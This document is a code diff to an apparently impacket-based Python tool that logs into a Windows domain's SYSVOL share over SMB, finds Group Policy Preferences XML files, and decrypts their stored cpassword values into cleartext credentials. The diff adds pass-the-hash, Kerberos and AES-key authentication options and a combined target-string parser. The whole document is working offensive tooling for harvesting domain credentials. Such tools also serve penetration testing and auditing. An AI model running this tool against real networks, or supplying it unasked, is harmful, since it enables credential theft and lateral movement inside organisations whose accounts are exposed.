@@ -13,6 +13,10 @@ import argparse
 import logging
 import chardet
 import base64
+import sys
+import re
+import traceback
+
 from xml.dom import minidom
 from io import BytesIO
 
@@ -29,72 +33,27 @@ from impacket.smb3structs import FILE_DIRECTORY_FILE, FILE_LIST_DIRECTORY
 class GetGPPasswords(object):
     """docstring for GetGPPasswords."""
 
-    def __init__(self, share, domain, username, password, host, port, verbose=False):
+    def __init__(self, smb, share):
         super(GetGPPasswords, self).__init__()
-        self.loggedIn = False
+        self.smb = smb
         self.share = share
-        self.domain = domain
-        self.username = username
-        self.password = password
-        self.host = host
-        self.port = port
-        self.verbose = verbose
-        self.init_smb()
-
-    def init_smb(self):  # ok
-        if self.port == 139:
-            self.smb = SMBConnection('*SMBSERVER', self.host, sess_port=self.port)
-        else:
-            self.smb = SMBConnection(self.host, self.host, sess_port=self.port)
-        dialect = self.smb.getDialect()
-        if dialect == SMB_DIALECT:
-            logging.debug("SMBv1 dialect used")
-        elif dialect == SMB2_DIALECT_002:
-            logging.debug("SMBv2.0 dialect used")
-        elif dialect == SMB2_DIALECT_21:
-            logging.debug("SMBv2.1 dialect used")
-        else:
-            logging.debug("SMBv3.0 dialect used")
-        return self.smb
-
-    def login(self):
-        if self.smb is None:
-            logging.error("No connection open")
-            return
-
-        self.domain = ""
-        if self.username.find('/') > 0:
-            self.domain, self.username = self.username.split('/')
-
-        self.smb.login(self.username, self.password, domain=self.domain)
-
-        if self.smb.isGuestSession() > 0:
-            logging.debug("GUEST Session Granted")
-        else:
-            logging.debug("USER Session Granted")
-        self.loggedIn = True
 
     def list_shares(self):
-        if self.loggedIn is False:
-            logging.error("Not logged in")
-            return
         logging.info("Listing shares...")
         resp = self.smb.listShares()
         shares = []
         for k in range(len(resp)):
             shares.append(resp[k]['shi1_netname'][:-1])
             print('  - %s' % resp[k]['shi1_netname'][:-1])
-        print("")
+        print()
 
-    def find_files(self, extension='xml'):
-        if self.loggedIn is False:
-            logging.error("Not logged in")
-            return
+    def find_files(self, base_dir, extension='xml'):
         logging.info("Searching *.%s files..." % extension)
-
         # Breadth-first search algorithm
         files = []
-        searchdirs = ['/']
+        #searchdirs = ['/']
+        # todo : fix this + '/'
+        searchdirs = [base_dir + '/']
         while len(searchdirs) != 0:
             next_dirs = []
             for sdir in searchdirs:
@@ -113,14 +72,12 @@ class GetGPPasswords(object):
             searchdirs = next_dirs
             logging.debug('Next iteration with %d folders.' % len(next_dirs))
         logging.debug('Found %d %s files' % (len(files), extension))
+        logging.debug('Printing matching files...')
         for f in files:
-            logging.debug(' - %s' % f)
+            logging.debug(f)
         return files
 
     def parse(self, files=[]):
-        if self.loggedIn is False:
-            logging.error("Not logged in")
-            return
         results = []
         for filename in files:
             filename = filename.replace('/', '\\')
@@ -140,14 +97,15 @@ class GetGPPasswords(object):
                 logging.debug(filecontent)
                 root = minidom.parseString(filecontent)
                 properties_list = root.getElementsByTagName("Properties")
-                read_or_empty = lambda element,attribute : (element.getAttribute(attribute) if element.getAttribute(attribute) != None else "")
+                read_or_empty = lambda element, attribute: (
+                    element.getAttribute(attribute) if element.getAttribute(attribute) != None else "")
                 for properties in properties_list:
                     results.append({
-                        'newname': read_or_empty(properties,'newName'), # todo : can be empty
-                        'changed': read_or_empty(properties.parentNode,'changed'),
-                        'cpassword': read_or_empty(properties,'cpassword'),
-                        'password': self.decrypt_password(read_or_empty(properties,'cpassword')),
-                        'username': read_or_empty(properties,'userName'),
+                        'newname': read_or_empty(properties, 'newName'),
+                        'changed': read_or_empty(properties.parentNode, 'changed'),
+                        'cpassword': read_or_empty(properties, 'cpassword'),
+                        'password': self.decrypt_password(read_or_empty(properties, 'cpassword')),
+                        'username': read_or_empty(properties, 'userName'),
                         'file': filename
                     })
                 fh.close()
@@ -177,22 +135,43 @@ class GetGPPasswords(object):
             logging.info(f"Changed\t: {result['changed']}")
             logging.info(f"Username\t: {result['username']}")
             logging.info(f"Password\t: {result['password']}")
-            logging.info(f"File\t\t: {result['file']}\n")
+            logging.info(f"File\t: {result['file']}\n")
+
 
 def parse_args():
-    parser = argparse.ArgumentParser(description='Group Policy Preferences passwords finder and decryptor')
-    parser.add_argument("server", type=str, help='Target SMB server address')
-    # todo : add smb2support
-    # todo : add pth support (-hashes)
-    # group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH') # todo : enable this
-    # todo : add -root-directories (find another name) (default to Policies)
-    parser.add_argument("-d", "--domain", type=str, required=False, default="", help="SMB Password")
-    parser.add_argument("-u", "--username", type=str, required=False, default="", help="SMB Username")
-    parser.add_argument("-p", "--password", type=str, required=False, default="", help="SMB Password")
+    parser = argparse.ArgumentParser(add_help=True,
+                                     description='Group Policy Preferences passwords finder and decryptor')
+    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
     parser.add_argument("-share", type=str, required=False, default="SYSVOL", help="SMB Share")
-    parser.add_argument("-P", "--port", type=int, required=False, default=445, help="Server port")
-    parser.add_argument("-debug", required=False, default=False, action="store_true", help="")
+    parser.add_argument("-base-dir", type=str, required=False, default="/", help="Directory to search in (Default: /)")
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
+    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+
+    group = parser.add_argument_group('authentication')
+    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
+    group.add_argument('-k', action="store_true",
+                       help='Use Kerberos authentication. Grabs credentials from ccache file '
+                            '(KRB5CCNAME) based on target parameters. If valid credentials '
+                            'cannot be found, it will use the ones specified in the command '
+                            'line')
+    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
+                                                                          '(128 or 256 bits)')
+
+    group = parser.add_argument_group('connection')
+
+    group.add_argument('-dc-ip', action='store', metavar="ip address",
+                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
+                            'the target parameter')
+    group.add_argument('-target-ip', action='store', metavar="ip address",
+                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
+                            'This is useful when target is the NetBIOS name and you cannot resolve it')
+    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
+                       help='Destination port to connect to SMB Server')
+    if len(sys.argv) == 1:
+        parser.print_help()
+        sys.exit(1)
+
     return parser.parse_args()
 
 
@@ -211,9 +190,61 @@ if __name__ == '__main__':
         logging.getLogger().setLevel(logging.INFO)
         logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
 
-    g = GetGPPasswords(args.share, args.domain, args.username, args.password, args.server, args.port)
-    g.login()
-    g.list_shares()
-    files = g.find_files()
-    results = g.parse(files)
-    g.show(results)
+    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
+        args.target).groups('')
+
+    # In case the password contains '@'
+    if '@' in address:
+        password = password + '@' + address.rpartition('@')[0]
+        address = address.rpartition('@')[2]
+
+    if args.target_ip is None:
+        args.target_ip = address
+
+    if domain is None:
+        domain = ''
+
+    if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
+        from getpass import getpass
+
+        password = getpass("Password:")
+
+    if args.aesKey is not None:
+        args.k = True
+
+    if args.hashes is not None:
+        lmhash, nthash = args.hashes.split(':')
+    else:
+        lmhash = ''
+        nthash = ''
+
+    try:
+        smbClient = SMBConnection(address, args.target_ip, sess_port=int(args.port))
+        dialect = smbClient.getDialect()
+        if dialect == SMB_DIALECT:
+            logging.debug("SMBv1 dialect used")
+        elif dialect == SMB2_DIALECT_002:
+            logging.debug("SMBv2.0 dialect used")
+        elif dialect == SMB2_DIALECT_21:
+            logging.debug("SMBv2.1 dialect used")
+        else:
+            logging.debug("SMBv3.0 dialect used")
+        if args.k is True:
+            smbClient.kerberosLogin(username, password, domain, lmhash, nthash, args.aesKey, args.dc_ip)
+        else:
+            smbClient.login(username, password, domain, lmhash, nthash)
+        if smbClient.isGuestSession() > 0:
+            logging.debug("GUEST Session Granted")
+        else:
+            logging.debug("USER Session Granted")
+
+        g = GetGPPasswords(smbClient, args.share)
+        g.list_shares()
+        files = g.find_files(args.base_dir)
+        results = g.parse(files)
+        g.show(results)
+
+    except Exception as e:
+        if logging.getLogger().level == logging.DEBUG:
+            traceback.print_exc()
+        logging.error(str(e))
